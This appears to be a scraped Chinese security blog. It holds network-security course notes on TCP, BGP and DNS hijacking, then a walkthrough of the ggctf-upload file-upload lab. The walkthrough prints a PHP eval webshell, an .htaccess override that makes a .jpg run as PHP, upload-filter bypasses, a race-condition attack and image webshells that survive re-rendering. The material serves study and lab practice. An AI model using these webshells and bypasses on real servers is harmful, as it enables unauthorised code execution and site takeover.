如果不在路由上，那么就是Off-path,这种劫持就无法直接注入错误的信息了 TCP connection 如何唯一识别一个TCP连接呢？ (source IP address + port number) + (destination IP address + port number) Port number就指示了双方所运行的应用层的应用 TCP three-way handshake\n通过不断增加Sequence number以及Acknowledgement number来实现握手，以及后续的通信 How does an attacker hijack a TCP session?\n攻击者需要构造一个TCP segment来满足sequence number \u0026amp; acknowledgement number的回复 那么需要的信息有 Source IP address + port number (easy to get) Destination IP address + port number (easy to get) Sequence number (如果攻击者在路由上的话就不会很难，因为可以通过获取到的通信数据包来推测) Sequence number可以是捕捉到的数据包的sequence number + 1 亦或是+ n，只要n不要太大，接收者都会将这些数据包保存在buffer中，等待中间“未接收到”的数据包 TCP on-path connection hijacking TCP on-path connection hijacking, attacker可以更方便的接收到通信的sequence number和acknowledgement number 只需要合理增加数字，就可以实现劫持，并发出恶意修改的数据： 嗅探数据包 预测sequence number (client -\u0026gt; server; server -\u0026gt; client) 注入恶意数据 TCP off-path connection hijacking 由于攻击者的主机并不在连接的路由上，因此attacker没有办法获取任何当前连接的信息，因此其需要主动发起一个连接，然后在劫持这个连接，同时返回合法的sequence number,但这一次因为无法进行嗅探，只能进行猜测 How to guess the initial sequence number\n这里利用的就是一些操作系统没有使用规范的标准来实现TCP连接 RFC 793 (TCP specification) :\nWhen new connections are created, an initial sequence number (ISN) generator is employed which selects a new 32 bit ISN. The generator is bound to a 32 bit clock whose low order bit is incremented roughly every 4 microseconds. Thus, the ISN cycles approximately every 4.55 hours. (4 microseconds x 2^32) Since we assume that segments will stay in the network no more than the Maximum Segment Lifetime (MSL, defined as 2 minutes in RFC 793) and that the MSL is less than 4.55 hours we can reasonably assume that ISN’s will be unique. [i.e., sequence numbers should not repeat for at least 4.55 hours] The purpose is to ensure undelivered packets from previous connection that arrive late do not overlap with current connection 总结：在RFC 793的标准下，sequence number的递增周期就是4.55 hours，这超出了最长的连接时间(2mins),因此无论怎么递增，都基本不会从头开始，可以将所有的sequence number看作是unique唯一的 Unfortunately, BSD Unix TCP/IP stack did not adhere to these recommendations : - The sequence number for BSD TCP/IP stacks increases by 128,000 every second and by 64,000 for every new TCP connection. - Such a sequence is relatively easy to predict and can be much more readily exploited than one which follows the RFC standard 可是在BSD Unix中，却没有按照标准实现，而是变成了sequence number每秒增加128,000，每一个新的连接增加 64,000, 这放宽了预测的时间以及缩小了范围，使sequence number很容易被预测 TCP initial sequence number attack\nAttacker首先通过flooding使client无法正常工作，然后发起一个新的TCP连接给server，然后通过预测sequence number来伪装成client来进行通信 BGP Route Hijacking BGP and AS Border Gateway Procol 也被认为是最重要的Internet协议之一，因为其能够把多个ISPs组织在一起运作 BGP是一个inter-Autonomous System (ASs) 路由协议（用于自治区内部的设备之前通信） Autonomous system (AS, 自治系统) AS是路由策略中的基本单位，由同一个组织的管理员所管理的所有网络都属于一个AS来作为路由协议的基础 每一个AS内部都有很多设备相连，也会有很多的网络 sometimes referred to as a routing domain Autonomous System Number (ASN), 每一个AS都有一个，全球唯一 BGP routing table and CIDR prefix 在BGP中，路由并不是直接指定如何到达一个IP地址，而是如何达到一个网段， Classless Inter-Domain Routing (CIDR) prefixes CIDR prefix\nCIDR prefix就是subnet mask中含有1的数量 172.16.122.204/16 就位于172.16.0.0/16网段当中，前面16bits为network段，用来指示网段;后面为host段，用来指示具体的主机 CIDR prefix = 16 BGP Routing table 由两部分组成一个entry (x, l)： x就是网段 l就是路由器的接口interface，指向下一跳的地址 BGP 的功能\n从周边的ASs中获取不同的网段的reachability BGP允许所有的子网都能宣告自己的存在 BGP接着会确保所有的路由器都能知道这个子网的存在 决定每一个路由器到达不同子网的最优路径 Policy Prefix reachability information ASs使用最长掩码匹配机制（longest prefix matching）来选择路径 例如当需要决定192.168.20.19的路由时，有两个子网需要选择 192.168.20.16/28; 192.168.0.0/16 选择192.168.20.16/28，因为其子网掩码长，更具体 BGP route advertisement and propagation 接着我们具体展开来讲上面提到过的BGP的功能 首先是宣告子网的功能 例如下图，AS22394中有66.174.161.0/24这个子网，于是其开始向外宣告自己有这个子网 然后按照相邻的顺序，AS6167首先收到了这个宣告，然后记录下来6167,22394这个顺序 然后依次继续宣告，并不断记录次序，方便将来路由 eBGP and iBGP connections 那么AS中也有很多的路由器属于不同的网络，他们之前也会交换子网的信息方便AS内部的路由，因此有内外两种BGP协议来进行路由 eBGP, external BGP (TCP),用于不同的AS之前的路由器之间的通信 iEBGP, internal BGP (TCP), 用于同一个AS中的路由器之间的通信 BGP route/prefix/sub-prefix hijacking 那么有信息交换，就有hijacking，本质上BGP的hijacking的目的就是通过宣告攻击者的AS能够到达目标子网，来诱使其他的AS将原本将要发送到目标子网的数据发送到攻击者的AS中来。其中也有两种不同的方式 BGP route/prefix hijacking\n一种是通过直接宣告目标子网在攻击者的AS中的错误信息来误导其他AS将数据发送过来 BGP sub-prefix hijacking\n就是利用我们之前提到的过的longest matching原则，通过加长子网掩码的长度，诱导AS选择更为确切的子网 例如目标子网为10.100.0.0/16，攻击者就宣告，10.100.0.0/24 来误导其他的AS BGP routing blackhole and two incidents How to create a routing blackhole? 如果ASs开始宣告无法提供的子网，那么整一个Internet就会陷入混乱，因为数据包永远无法到达应该发送的位置，也收不到任何的回复 DNS Cache Poisoning DNS and DNS structure Domain Name System, DNS 一个分布式的数据库用来存储DNS信息，从而完成一个DNS服务器架构 一个应用层的协议来向所有主机提供数据库信息 为什么我们需要DNS？ 理由也很简单，好记！现在IPv4已经被用完了，取而代之的是更长的IPv6，如果每访问一个网站都需要记住IP地址就太麻烦了 DNS服务器采用树状结构 全世界一共有13个root server 顶级域名Top level domain (TLD) com,edu, org, net, gov .etc cn, uk, de, eu, etc. 本博客目前的域名后缀后缀就是org.cn DNS name resolution (iterative and recursive) DNS主要的作用就是map Domain names to IP addresses IP addresses to Domain names DNS resolver向 nameservers 进行mapping请求，一般我们将查询请求分为两种 Iterative DNS query with caching 迭代查询\n顾名思义就是一个个DNS服务器查过来，一个查不到就下一个 Local DNS server root DNS server Top level DNS server Authoritative DNS server Recursive DNS query with caching 递归查询\n同样也是按次序查询，但是不同的地方在于，只有查到了才会原路返回给用户，否则就会继续将查询递交给下一个服务器 注：一般来说不会在实际中使用 DNS caching Why we need DNS caching? 通过缓存这些DNS的map信息来加速网页的访问 比如已经查到过一次谷歌的域名和IP地址的map之后，就存在本地的DNS server上，这样下一次就不用花这么多步骤再去查询了 DNS cache poisoning attack 那么这种偷懒的办法也就会遭到黑客的攻击，如果在DNS查询的过程中，黑客发送了伪造的DNS记录给本地的DNS server，那么既而被缓存在本地，造成长久的损害。 同时还会给同一区域的其他设备造成危害，记得之前我们在SCT中提到过的 Water holing attack 就是利用了 DNS cache poisoning attack, 通过获取组织内最频繁访问的页面，就可以利用DNS poisoning来将那个网站改为黑客所构建的恶意网站，既而达到其攻击目的 How DNS poisoning attack works？ 那么具体是如何伪造的DNS query回复来使DNS server认为其是合法的查询结构并缓存的呢？ 这里也有两种手段 Query QID attack\n每一个DNS query 都有一个唯一的 QID DNS使用UDP进行通信 因此不存在连接的说法，只要能够选对正确的QID，就能成功代替真实的回复 RRSet attack\n每一个DNS query response 会包含一组记录集，Resource Record Sets, or RRSets 同时，这些记录集不只包含mapping的entry，还可以增加一些其他额外的信息，对未来的mapping有所“帮助” 比如在一次递归查询中，一般会包含域名的mapping可以在某一个服务器上获得之类的信息，黑客就可以选择篡改这个信息，直接改为mapping的信息，就可以达到其重定向的目的 ","date":"2022-04-28T00:00:00Z","permalink":"https://ginkgo.org.cn/posts/nse_week_4_hijacking_and_poisoning/","title":"NSE Week4: Hijacking and poisoning"},{"content":"File Upload: ggctf-upload 《学了一天 file-uploads之直接换到国光师傅的靶场.jpg》 主要是file-uploads 看上去还有很多的 open的issue，我自己闯关的时候也碰到了很多问题，在docker里面很多环境内容改起来也不舒服，刚好看到国光师傅写的这个ggctf-upload，有配套的wp并且长得也好看就是了 JS 第一关是一个前端后缀名检查绕过 解法一：抓包修改白名单 用Burp拦截之后增加php到whitelist中就好了（白名单再强能被改就是白给233） 上传成功，用蚁剑连接一下试试（这里可以在网页源码或者Burp的返回请求中看到图片的链接，如果临时文件存放的名字被改了就用得上） 用到的一句话木马 \u0026lt;?php @eval($_POST[\u0026#34;a\u0026#34;]);?\u0026gt; PHP中@的作用，本质上就是可以忽略所有的错误信息 解法二：禁用JS 利用浏览器的选项或者插件禁用JS之后，客户端的过滤就失效了 解法三：JS debug 在定义白名单出打上断点，然后刷新一下，步过之后修改白名单的内容即可（chrome可以直接在边上的Scopes中改，firefox直接console定义一下即可） 解析上传 自本文完成，国光的wp并未更新第二题，但是类似的利用很多，本文主要是利用.htaccess的特性来修改服务器对于文件的解析来实现绕过 .htaccess的作用 .htaccess文件是Apache服务器下的一个配置文件，主要用于 相关目录 下的网页配置 其作用域为其所在目录与所有的子目录，但是如果子目录中的 .htaccess 会覆盖父目录的效果 因此我们通过上传一个 .htaccess 文件来修改 upload 目录下对于文件的解析来实现绕过 以此上传两个文件 .htaccess 将 trojan.jpg 文件当作 php 来解析 \u0026lt;!-- .htaccess --\u0026gt; \u0026lt;FilesMatch \u0026#34;trojan.jpg\u0026#34;\u0026gt; Sethandler application/x-httpd-php \u0026lt;/FilesMatch\u0026gt; 以及含有一句话木马的 trojan.jpg \u0026lt;?php @eval($_POST[\u0026#34;a\u0026#34;]);?\u0026gt; 之后就可以用蚁剑测试连接成功（我这里发现测试连接性会报错，但是实际添加了连接是可以连接的） 感觉其实要是像upload-files一样把源码贴出来就好了233 最后我们来一起看一下php源码，主要是利用了黑名单过滤所有的webshell if (!empty($_POST[\u0026#39;submit\u0026#39;])) { $name = basename($_FILES[\u0026#39;file\u0026#39;][\u0026#39;name\u0026#39;]); $ext = pathinfo($name)[\u0026#39;extension\u0026#39;]; $blacklist = array(\u0026#34;php\u0026#34;, \u0026#34;php7\u0026#34;, \u0026#34;php5\u0026#34;, \u0026#34;php4\u0026#34;, \u0026#34;php3\u0026#34;, \u0026#34;phtml\u0026#34;, \u0026#34;pht\u0026#34;, \u0026#34;jsp\u0026#34;, \u0026#34;jspa\u0026#34;, \u0026#34;jspx\u0026#34;, \u0026#34;jsw\u0026#34;, \u0026#34;jsv\u0026#34;, \u0026#34;jspf\u0026#34;, \u0026#34;jtml\u0026#34;, \u0026#34;asp\u0026#34;, \u0026#34;aspx\u0026#34;, \u0026#34;asa\u0026#34;, \u0026#34;asax\u0026#34;, \u0026#34;ascx\u0026#34;, \u0026#34;ashx\u0026#34;, \u0026#34;asmx\u0026#34;, \u0026#34;cer\u0026#34;, \u0026#34;swf\u0026#34;); if (!in_array($ext, $blacklist)) { if (move_uploaded_file($_FILES[\u0026#39;file\u0026#39;][\u0026#39;tmp_name\u0026#39;], UPLOAD_PATH . $name)) { $is_upload = true; } else { echo \u0026#34;\u0026lt;script\u0026gt;error();\u0026lt;/script\u0026gt;\u0026#34;; } } else { echo \u0026#34;\u0026lt;script\u0026gt;black();\u0026lt;/script\u0026gt;\u0026#34;; } } basename() basename(string $path, string $suffix = \u0026ldquo;\u0026rdquo;): string path: 文件路径 suffix: 文件后缀 return: 文件名（有/无后缀） pathinfo pathinfo(string $path, int $flags = PATHINFO_ALL): array|string path: 文件路径 flags: 指定需要返回的内容{dirname, basename, extension, filename} return: 根据flags决定, 多个内容的话就会返回数组（默认全部） MIME 绕过 首先我们根据提示信息来认识一下 MIME 媒体类型（通常称为 Multipurpose Internet Mail Extensions 或 MIME 类型 ）是一种标准，用来表示文档、文件或字节流的性质和格式。 MIME的组成结构非常简单；由类型与子类型两个字符串中间用 \u0026lsquo;/\u0026rsquo; 分隔而组成。不允许空格存在。 type 表示可以被分多个子类的独立类别。 subtype 表示细分后的每个类型 通用的结构为： type/subtype MIME类型对大小写不敏感，但是传统写法都是小写。 然后查看源码 if (!empty($_POST[\u0026#39;submit\u0026#39;])) { if (!in_array($_FILES[\u0026#39;file\u0026#39;][\u0026#39;type\u0026#39;], [\u0026#34;image/jpeg\u0026#34;, \u0026#34;image/png\u0026#34;, \u0026#34;image/gif\u0026#34;, \u0026#34;image/jpg\u0026#34;])) { echo \u0026#34;\u0026lt;script\u0026gt;black();\u0026lt;/script\u0026gt;\u0026#34;; } else { $name = basename($_FILES[\u0026#39;file\u0026#39;][\u0026#39;name\u0026#39;]); if (move_uploaded_file($_FILES[\u0026#39;file\u0026#39;][\u0026#39;tmp_name\u0026#39;], UPLOAD_PATH . $name)) { $is_upload = true; } else { echo \u0026#34;\u0026lt;script\u0026gt;alert(\u0026#39;上传失败\u0026#39;)\u0026lt;/script\u0026gt;\u0026#34;; } } } 这里检查的方式是检查 $_FILES['file']['type'] 的值，这里我们来学习一下PHP的 superglobals: $_FILES,以及其相关的用法 $_FILES PHP官网：\u0026ldquo;An associative array of items uploaded to the current script via the HTTP POST method.\u0026rdquo; 即一个存放所有通过 POST 方法上传的文件信息的数组 然后我们来看看 POST 上传中所包含文件的信息 $_FILES[\u0026lsquo;userfile\u0026rsquo;][\u0026rsquo;name\u0026rsquo;] 从客户端上传的文件的原始名字 $_FILES[\u0026lsquo;userfile\u0026rsquo;][\u0026rsquo;type\u0026rsquo;] 文件的MIME types， $_FILES[\u0026lsquo;userfile\u0026rsquo;][\u0026lsquo;size\u0026rsquo;] 文件的大小(bytes) $_FILES[\u0026lsquo;userfile\u0026rsquo;][\u0026rsquo;tmp_name\u0026rsquo;] 用于存储文件将要存放在server的临时名字 $_FILES[\u0026lsquo;userfile\u0026rsquo;][\u0026rsquo;error\u0026rsquo;] 上传失败的错误信息 $_FILES[\u0026lsquo;userfile\u0026rsquo;][\u0026lsquo;full_path\u0026rsquo;] 浏览器提交的完整路径? PHP8.1.0支持 接着我们来看本次文件上传的HTTP请求 是不是能发现我们刚刚提到过的 $_FILES 的信息？ userfile = \u0026ldquo;file\u0026rdquo; $_FILES[\u0026lsquo;userfile\u0026rsquo;][\u0026rsquo;type\u0026rsquo;] = \u0026ldquo;text/php\u0026rdquo; $_FILES[\u0026lsquo;userfile\u0026rsquo;][\u0026rsquo;name\u0026rsquo;] = \u0026ldquo;trojan.php\u0026rdquo; 因此我们通过抓包后修改 MIME 格式为白名单中的任意一个图片格式即可绕过 蚁剑连接测试成功 文件头绕过 题目提示给的信息已经很多全面了，每一个文件的开头都存放了响应的格式指示，因此我们的目标就是修改这个文件头来实现绕过 接着我们结合源码来看，后台首先还是检测了上题的 MIME 类型，需要修改一下，接着校验了三个图片格式的文件头是否存在于文件内 if (!in_array($_FILES[\u0026#39;file\u0026#39;][\u0026#39;type\u0026#39;], [\u0026#34;image/jpeg\u0026#34;, \u0026#34;image/jpg\u0026#34;, \u0026#34;image/png\u0026#34;, \u0026#34;image/gif\u0026#34;])) { echo \u0026#34;\u0026lt;script\u0026gt;black();\u0026lt;/script\u0026gt;\u0026#34;; } else if (!in_array(bin2hex($bin), [\u0026#34;89504E47\u0026#34;, \u0026#34;FFD8FFE0\u0026#34;, \u0026#34;47494638\u0026#34;])) { echo \u0026#34;\u0026lt;script\u0026gt;black();\u0026lt;/script\u0026gt;\u0026#34;; } else { $name = basename($_FILES[\u0026#39;file\u0026#39;][\u0026#39;name\u0026#39;]); if (move_uploaded_file($_FILES[\u0026#39;file\u0026#39;][\u0026#39;tmp_name\u0026#39;], UPLOAD_PATH . $name)) { $is_upload = true; } else { echo \u0026#34;\u0026lt;script\u0026gt;error();\u0026lt;/script\u0026gt;\u0026#34;; } } 那我们只需要用Burp截取请求之后，修改MIME类型以及加上文件头即可 蚁剑连接成功 JPEG (jpg)，文件头：FFD8FF， ÿØÿ PNG (png)，文件头：89504E47， .PNG GIF (gif)，文件头：47494638， GIF8 HTML (html)，文件头：68746D6C3E, html\u0026gt; ZIP Archive (zip)，文件头：504B0304, PK.. RAR Archive (rar)，文件头：52617221, Rar! Adobe Acrobat (pdf)，文件头：255044462D312E, %PDF-1. MS Word/Excel (xls.or.doc)，文件头：D0CF11E0, ÐÏ.à 有缺陷的代码1 根据题目提示结合源码，我们得知这里用了一个黑名单来过滤所有的webshell以及htaccess后缀的文件，猜测绕过可能发生在方法 str_ireplace 身上 if (!empty($_POST[\u0026#39;submit\u0026#39;])) { $name = basename($_FILES[\u0026#39;file\u0026#39;][\u0026#39;name\u0026#39;]); $blacklist = array(\u0026#34;php\u0026#34;, \u0026#34;php5\u0026#34;, \u0026#34;php4\u0026#34;, \u0026#34;php3\u0026#34;, \u0026#34;phtml\u0026#34;, \u0026#34;pht\u0026#34;, \u0026#34;jsp\u0026#34;, \u0026#34;jspa\u0026#34;, \u0026#34;jspx\u0026#34;, \u0026#34;jsw\u0026#34;, \u0026#34;jsv\u0026#34;, \u0026#34;jspf\u0026#34;, \u0026#34;jtml\u0026#34;, \u0026#34;asp\u0026#34;, \u0026#34;aspx\u0026#34;, \u0026#34;asa\u0026#34;, \u0026#34;asax\u0026#34;, \u0026#34;ascx\u0026#34;, \u0026#34;ashx\u0026#34;, \u0026#34;asmx\u0026#34;, \u0026#34;cer\u0026#34;, \u0026#34;swf\u0026#34;, \u0026#34;htaccess\u0026#34;, \u0026#34;ini\u0026#34;); $name = str_ireplace($blacklist, \u0026#34;\u0026#34;, $name); if (move_uploaded_file($_FILES[\u0026#39;file\u0026#39;][\u0026#39;tmp_name\u0026#39;], UPLOAD_PATH . $name)) { $is_upload = true; } else { echo \u0026#34;\u0026lt;script\u0026gt;error();\u0026lt;/script\u0026gt;\u0026#34;; } } 根据以前绕过类似黑名单的经历，这里的 str_ireplace 简单的将所有的匹配替换为空，非常的危险，我们可以通过复写拼接的手段来进行绕过过滤 例如 pphphp 第一个碰到的php被替换之后，就可以形成一个完整的php后缀了 蚁剑连接测试成功 有缺陷的代码2 因为提示与上一题基本类似，不过提到了手动改成了Windows的特性，因此我们直接一起来看一下源码吧 if (!empty($_POST[\u0026#39;submit\u0026#39;])) { $name = basename($_FILES[\u0026#39;file\u0026#39;][\u0026#39;name\u0026#39;]); $blacklist = array(\u0026#34;php\u0026#34;, \u0026#34;php5\u0026#34;, \u0026#34;php4\u0026#34;, \u0026#34;php3\u0026#34;, \u0026#34;phtml\u0026#34;, \u0026#34;pht\u0026#34;, \u0026#34;jsp\u0026#34;, \u0026#34;jspa\u0026#34;, \u0026#34;jspx\u0026#34;, \u0026#34;jsw\u0026#34;, \u0026#34;jsv\u0026#34;, \u0026#34;jspf\u0026#34;, \u0026#34;jtml\u0026#34;, \u0026#34;asp\u0026#34;, \u0026#34;aspx\u0026#34;, \u0026#34;asa\u0026#34;, \u0026#34;asax\u0026#34;, \u0026#34;ascx\u0026#34;, \u0026#34;ashx\u0026#34;, \u0026#34;asmx\u0026#34;, \u0026#34;cer\u0026#34;, \u0026#34;swf\u0026#34;, \u0026#34;htaccess\u0026#34;, \u0026#34;ini\u0026#34;); $name = str_replace($blacklist, \u0026#34; \u0026#34;, $name); if (move_uploaded_file($_FILES[\u0026#39;file\u0026#39;][\u0026#39;tmp_name\u0026#39;], UPLOAD_PATH . $name)) { $is_upload = true; } else { echo \u0026#34;\u0026lt;script\u0026gt;error();\u0026lt;/script\u0026gt;\u0026#34;; } } 发现这次的 str_replace() 方法替换的是空格，因此没办法用上一遍的套路 仔细一看，此replace非彼replace，这个 str_replace 是case sensitive而前一个的 str_ireplace 指的就是 case insensitive 那么我们用 Php 即可完成绕过 但是就像提示所说的那样，这题实际用蚁剑是没有办法成功连接的，因为毕竟只是模拟windows环境，本质上还是linux，不存在这样的漏洞 古老的漏洞 - 1 根据本题的提示，这是一个00漏洞，说其古老主要是因为只有在PHP版本小于5.3.4版本才有效，并且要求magic_quotes_gpc = Off的情况（我们在sqli-labs的学习中看到过这个） 结合源码来看，这里用了一个严格的白名单过滤，并且利用随机临时文件名，让我们无法使用 htaccess 来修改指定文件的配置 if (!empty($_POST[\u0026#39;submit\u0026#39;])) { $name = basename($_FILES[\u0026#39;file\u0026#39;][\u0026#39;name\u0026#39;]); $info = pathinfo($name); $ext = $info[\u0026#39;extension\u0026#39;]; $whitelist = array(\u0026#34;jpg\u0026#34;, \u0026#34;jpeg\u0026#34;, \u0026#34;png\u0026#34;, \u0026#34;gif\u0026#34;); if (in_array($ext, $whitelist)) { $filename = rand(10, 99) . date(\u0026#34;YmdHis\u0026#34;) . \u0026#34;.\u0026#34; . $ext; $des = $_GET[\u0026#39;road\u0026#39;] . \u0026#34;/\u0026#34; . $filename; if (move_uploaded_file($_FILES[\u0026#39;file\u0026#39;][\u0026#39;tmp_name\u0026#39;], $des)) { $is_upload = true; } else { echo \u0026#34;\u0026lt;script\u0026gt;black();\u0026lt;/script\u0026gt;\u0026#34;; } } else { echo \u0026#34;文件类型不匹配\u0026#34;; } } 因此我们我们通过修改POST的文件路径在后面加上 trojan.php%00,然后将上传的文件改成gif格式，这样在上面进行后缀判断的时候，用的就是 gif,而进行存储的时候提取的后缀名就会因为 %00 的关系忽略最后的 gif 以及临时文件名的名字而只保存 trojan.php 最后通过蚁剑连接成功 古老的漏洞 - 2 这题同样是利用00截断，只不过是发生在了 POST 请求上面 这里别忘了用URL解码一下，因为不像上一题是放在url里面会自动解析 蚁剑连接成功 黑名单缺陷 看源码，观察到用了一个黑名单来过滤webshell，但是一看就比之前遇到过的黑名单短了很多，我们这里利用webshell会有很多的解析的变种来完成绕过 将文件的后缀改为 php4 即可完成绕过 if (!empty($_POST[\u0026#39;submit\u0026#39;])) { $name = basename($_FILES[\u0026#39;file\u0026#39;][\u0026#39;name\u0026#39;]); $ext = pathinfo($name)[\u0026#39;extension\u0026#39;]; $blacklist = array(\u0026#34;asp\u0026#34;,\u0026#34;aspx\u0026#34;,\u0026#34;php\u0026#34;,\u0026#34;jsp\u0026#34;,\u0026#34;htaccess\u0026#34;); if (!in_array($ext, $blacklist)) { if (move_uploaded_file($_FILES[\u0026#39;file\u0026#39;][\u0026#39;tmp_name\u0026#39;], UPLOAD_PATH . $name)) { $is_upload = true; } else { echo \u0026#34;\u0026lt;script\u0026gt;error();\u0026lt;/script\u0026gt;\u0026#34;; } } else { echo \u0026#34;\u0026lt;script\u0026gt;black();\u0026lt;/script\u0026gt;\u0026#34;; } } 条件竞争 其实根据提醒我们已经可以有一个明确的思路了，就是我们利用系统一次只能处理一件事情的特性，通过同时发起上传以及访问的请求，导致服务器还来不及处理删除却先执行访问，导致webshell的写入 我们在结合源码来看，这里采用了白名单的手段避免了任何的绕过，所以我们来利用条件竞争来尝试绕过 if (!empty($_POST[\u0026#39;submit\u0026#39;])) { $name = basename($_FILES[\u0026#39;file\u0026#39;][\u0026#39;name\u0026#39;]); $ext = pathinfo($name)[\u0026#39;extension\u0026#39;]; $upload_file = UPLOAD_PATH . \u0026#39;/\u0026#39; . $name; $whitelist = array(\u0026#39;jpg\u0026#39;,\u0026#39;png\u0026#39;,\u0026#39;gif\u0026#39;,\u0026#39;jpeg\u0026#39;); if (move_uploaded_file($_FILES[\u0026#39;file\u0026#39;][\u0026#39;tmp_name\u0026#39;], UPLOAD_PATH . $name)) { if(in_array($ext,$whitelist)){ $rename_file = rand(10, 99).date(\u0026#34;YmdHis\u0026#34;).\u0026#34;.\u0026#34;.$ext; $img_path = UPLOAD_PATH . \u0026#39;/\u0026#39;. $rename_file; rename($upload_file, $img_path); $is_upload = true; }else{ echo \u0026#34;\u0026lt;script\u0026gt;black();\u0026lt;/script\u0026gt;\u0026#34;; unlink($upload_file); } } } 我们通过Burp的Intruder进行无限制的请求，一边上传文件，这将触发服务器进行审核以及删除，一边访问 shell.php 来调用，最终服务器会因为来不及删除而导致webshell被成功调用， trojan.php 被写入。 最终我们可以看到 trojan.php 被成功写入，同时用蚁剑测试连接成功 二次渲染 根据提示信息，我们知道我们所上传的图片马会被二次渲染，导致失效，因此我们分不同的图片格式来绕过 同时我们点击查看提示的按钮，可以发现url发生了变化，结合源码，我们发现这里可以用来解析我们上传成功绕过渲染的图片马，形成文件上传漏洞 \u0026lt;center\u0026gt;\u0026lt;button type=\u0026#34;button\u0026#34; class=\u0026#34;btn btn-success\u0026#34; onclick=\u0026#34;window.location.href=(\u0026#39;?file=hint.html\u0026#39;)\u0026#34;\u0026gt;点击查看 “提示”\u0026lt;/button\u0026gt;\u0026lt;/center\u0026gt;\u0026lt;br\u0026gt; \u0026lt;p class=\u0026#34;lead\u0026#34;\u0026gt; 目前很多网站都会对用户上传的图片再次压缩、裁剪等渲染操作，所以普通的图片马都难逃被渲染的悲剧，那么有没有那种可以绕过渲染的图片呢？\u0026lt;br/\u0026gt;\u0026lt;br/\u0026gt; \u0026lt;?php include($_GET[\u0026#39;file\u0026#39;]); ?\u0026gt; \u0026lt;center\u0026gt;\u0026lt;button type=\u0026#34;button\u0026#34; class=\u0026#34;btn btn-success\u0026#34; onclick=\u0026#34;window.location.href=(\u0026#39;?file=hint.html\u0026#39;)\u0026#34;\u0026gt;点击查看 “提示”\u0026lt;/button\u0026gt;\u0026lt;/center\u0026gt;\u0026lt;br\u0026gt; GIF } else if(($fileext == \u0026#34;gif\u0026#34;) \u0026amp;\u0026amp; ($filetype==\u0026#34;image/gif\u0026#34;)){ if(move_uploaded_file($tmpname, $upload_file)){ //使用上传的图片生成新的图片 $im = imagecreatefromgif($upload_file); if($im == false){ echo \u0026#34;\u0026lt;script\u0026gt;black();\u0026lt;/script\u0026gt;\u0026#34;; @unlink($upload_file); } else { //给新图片指定文件名 srand(time()); $newfilename = strval(rand()).\u0026#34;.gif\u0026#34;; //显示二次渲染后的图片（使用用户上传图片生成的新图片） $img_path = UPLOAD_PATH.\u0026#39;/\u0026#39;.$newfilename; imagegif($im,$img_path); @unlink($upload_file); $is_upload = true; } } else { echo \u0026#34;\u0026lt;script\u0026gt;error();\u0026lt;/script\u0026gt;\u0026#34;; } } 我们用 Hex Friend 对比一下原gif和上传后二次渲染的gif 然后将一句话木马插入到没有被修改的位置即可 可以看到经过二次渲染的图片仍然含有一句话木马 再利用发现的漏洞，解析上传成功的图片马，蚁剑测试连接成功 PNG } else if(($fileext == \u0026#34;png\u0026#34;) \u0026amp;\u0026amp; ($filetype==\u0026#34;image/png\u0026#34;)){ if(move_uploaded_file($tmpname, $upload_file)){ //使 $im = imagecreatefrompng($upload_file); if($im == false){ echo \u0026#34;\u0026lt;script\u0026gt;black();\u0026lt;/script\u0026gt;\u0026#34;; @unlink($upload_file); } else { //给新图片指定文件名 srand(time()); $newfilename = strval(rand()).\u0026#34;.png\u0026#34;; //显示二次渲染后的图片（使用用户上传图片生成的新图片） $img_path = UPLOAD_PATH.\u0026#39;/\u0026#39;.$newfilename; imagepng($im,$img_path); @unlink($upload_file); $is_upload = true; } } 前置知识\n在介绍两种写入php一句话木马到PNG图片的方法之前，我们先来了解一下PNG图片的组成，参考janes师傅的文章：php imagecreatefrom* 系列函数之 png PNG 图片有三种图像模式：索引彩色图像(index-color images)，灰度图像(grayscale images)，真彩色图像(true-color images), 其中索引彩色图像也称为基于调色板图像(Palette-based images)。不同的图片模式主要是包含的信息，展现的图像不一样（色彩？） 一个PNG文件油一个 png signature 以及多个 png chunk 组成 PNG signature: png 标识 : 我们之前提到过的，用来指示文件格式的头部，8bites 89 50 4E 47 OD 0A 1A 0A PNG chunk: png 数据块 : PNG chunk又分为两种 - 关键数据块(critical chunk)，标准数据块： IHDR, IDAT, IEND - 辅助数据块(ancillary chunks), 可选数据库： PLTE PNG 数据块结构 : png数据块由四个部分组成： 1. length: 4 bytes 2. type: 4 bytes 3. data 4. CRC: 4bytes 接下来我们再简单介绍一些上面提到的标准数据块的作用，详细的信息可以参考文章或者参考更加专业的文档 IHDR : 文件头数据块IHDR(header chunk)：它包含有PNG文件中存储的图像数据的基本信息，并要作为第一个数据块出现在PNG数据流中，而且一个PNG数据流中 只能有一个文件头数据块 。 PLTE : 调色板数据块PLTE(palette chunk)包含有与索引彩色图像(indexed-color image)相关的彩色变换数据，它仅与索引彩色图像有关，而且要放在图像数据块(image data chunk)之前。 IDAT : 图像数据块IDAT(image data chunk)：它存储实际的数据，在数据流中可包含多个连续顺序的图像数据块。IDAT存放着图像 真正的数据信息 IEND : 图像结束数据IEND(image trailer chunk)：它用来标记PNG文件或者数据流已经结束，并且必须要放在文件的尾部。 根据文章的实验，只能向索引彩色图像(index-color images)的PLTE数据块插入php代码，其他都会被 imagecreatefrompng 渲染失效 写入 PLTE 数据块\n我们可以先利用imagemagick将图片转换为索引图像/基于调色板图像（Palette-based images） convert png.png -type Palette png_trojan.png 之后使用脚本来进行一句话木马的输入 python2 poc_png.py -p \u0026#39;\u0026lt;?php @eval($_POST[\u0026#34;a\u0026#34;]);?\u0026gt;\u0026#39; -o png_trojan.png png_trojan.png 尝试上传 查看二次渲染后的图片，发现一句话木马插入成功，蚁剑连接成功 写入IDAT数据块\n利用脚本， 下载二次渲染之后的图片，检查一句话木马 shell利用成功 JPG if(($fileext == \u0026#34;jpg\u0026#34;) \u0026amp;\u0026amp; ($filetype==\u0026#34;image/jpeg\u0026#34;)){ if(move_uploaded_file($tmpname, $upload_file)){ //使用上传的图片生成新的图片 $im = imagecreatefromjpeg($upload_file); if($im == false){ echo \u0026#34;\u0026lt;script\u0026gt;black();\u0026lt;/script\u0026gt;\u0026#34;; @unlink($upload_file); } else { //给新图片指定文件名 srand(time()); $newfilename = strval(rand()).\u0026#34;.jpg\u0026#34;; //显示二次渲染后的图片（使用用户上传图片生成的新图片） $img_path = UPLOAD_PATH.\u0026#39;/\u0026#39;.$newfilename; imagejpeg($im,$img_path); @unlink($upload_file); $is_upload = true; } } 我们首先上传一张图片 然后下载二次渲染之后的图片，用脚本注入php payload（可以改一下注入的payload）： BlackFan / jpg_payload php php jpg_payload.php [uploaded_jpg_image] 然后我们检查payload是否注入成功 再次上传，下载二次渲染后的图片查看 